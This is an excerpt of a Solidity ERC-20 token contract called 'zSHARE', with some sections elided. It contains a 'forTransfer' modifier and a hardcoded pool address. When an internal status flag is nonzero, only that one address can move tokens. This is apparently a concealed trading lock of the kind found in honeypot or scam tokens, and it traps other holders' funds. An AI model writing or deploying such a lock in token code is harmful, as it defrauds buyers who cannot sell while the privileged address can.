...
contract zSHAREToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenZS_totalSupply;
    uint256 private _tokenZS_status = 0;
    uint256 public stakingPoolZSStatus = 0;

    string private _tokenZS_name;
    string private _tokenZS_symbol;

    address private _poolZSAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenZS_name = "zSHARE";
        _tokenZS_symbol = "zSHARE";
        _tokenZS_totalSupply = 94500 * 10 ** 18;
        _balances[msg.sender] = _tokenZS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolZSAddress || _tokenZS_status == 0);
        _;
    }
    ...
    function name() public view virtual override returns (string memory) {
        return _tokenZS_name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokenZS_symbol;
    }
